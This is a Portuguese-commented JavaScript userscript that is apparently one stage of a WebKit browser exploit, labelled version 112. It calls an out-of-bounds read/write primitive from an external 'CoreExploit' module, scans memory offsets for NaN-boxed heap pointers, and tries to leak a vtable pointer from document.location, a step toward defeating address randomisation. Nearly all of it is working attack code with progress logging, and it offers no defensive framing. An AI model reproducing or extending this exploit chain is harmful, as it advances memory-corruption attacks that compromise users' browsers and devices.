// ==UserScript==
// @name         Uncaged_Hybrid_v112_CorePrimitives_Diag
// @version      112
// @description  Diagnóstico com varredura automática de offset NaN Boxing + correção do retorno arb_read()
// ==/UserScript==

(async () => {
  console.log("[Uncaged_Hybrid_v112] ==== INICIANDO Script 3 (Uncaged_Hybrid_v112_CorePrimitives_Diag) ... ====");

  // Imports e helpers necessários (supondo que já estejam no ambiente):
  const { triggerOOB_primitive, arb_read64, selfTestOOBReadWrite, setupOOBEnvironment } = CoreExploit;
  const { Int64 } = Int64Lib; // Biblioteca de manipulação Int64 utilizada previamente

  const OOB_DV_M_LENGTH_OFFSET = 0x70;

  // Função de leitura OOB padronizada para retornar Int64
  function arb_read64_fixed(offset) {
    let low = oob_dataview_real.getUint32(offset, true);
    let high = oob_dataview_real.getUint32(offset + 4, true);
    return new Int64([low, high]);
  }

  // Varredura automática de offset NaN Boxing
  async function scanNaNBoxingOffsets() {
    console.log("[NaNBoxingScanner] Iniciando varredura automática de offset...");
    let foundOffsets = [];

    for (let offset = 0; offset < 0x200; offset += 8) {
      try {
        let test_val = arb_read64_fixed(offset);
        let low = test_val.low32();
        let high = test_val.high32();

        // Critério: valor alto compatível com regiões típicas do heap + low != 0
        if (high !== 0 && low !== 0 && high !== 0x7ff7ffff) {
          console.log(`[NaNBoxingScanner] POSSÍVEL OFFSET: 0x${offset.toString(16).padStart(4, "0")} → ${test_val}`);
          foundOffsets.push({ offset, test_val });
        }
      } catch (e) {
        console.warn(`[NaNBoxingScanner] Erro em offset 0x${offset.toString(16)}: `, e);
      }
    }

    if (foundOffsets.length === 0) {
      console.warn("[NaNBoxingScanner] Nenhum offset promissor encontrado.");
    } else {
      console.log(`[NaNBoxingScanner] Total de offsets promissores encontrados: ${foundOffsets.length}`);
    }

    return foundOffsets;
  }

  // Correção do bug .isZero → função robusta de verificação
  function isZeroInt64(val) {
    return val instanceof Int64 && val.toString() === "0x0";
  }

  // Execução principal
  console.log("[Uncaged_Hybrid_v112] --- FASE 1/4: Configuração ambiente OOB... ---");
  triggerOOB_primitive(true);

  console.log("[Uncaged_Hybrid_v112] --- FASE 2/4: Autoteste de L/E... ---");
  selfTestOOBReadWrite();

  console.log("[Uncaged_Hybrid_v112] --- FASE 3/4: Varredura Automática de Offset NaN Boxing... ---");
  let offsets = await scanNaNBoxingOffsets();

  console.log("[Uncaged_Hybrid_v112] --- FASE 4/4: Tentativa de Vazamento WebKit usando offsets encontrados... ---");

  for (const { offset, test_val } of offsets) {
    console.log(`[LeakAttempt] Tentando vazamento a partir de offset 0x${offset.toString(16)} (${test_val})...`);

    // Tentativa: ler a vtable do objeto 'document.location'
    let targetObj = document.location;
    let targetAddr = arb_read64_fixed(offset); // Substituir por primitiva addrof real quando disponível

    console.log(`[LeakAttempt] Endereço alvo (document.location): ${targetAddr}`);

    let vtable_ptr = arb_read64_fixed(targetAddr.low32());

    console.log(`[LeakAttempt] Ponteiro da Vtable: ${vtable_ptr}`);

    if (!isZeroInt64(vtable_ptr)) {
      console.log(`[SUCCESS] Vazamento detectado! Offset: 0x${offset.toString(16)}, VtablePtr: ${vtable_ptr}`);
      break; // Se encontrou um bom, para aqui.
    }
  }

  console.log("[Uncaged_Hybrid_v112] ==== Script Finalizado ====");
})();
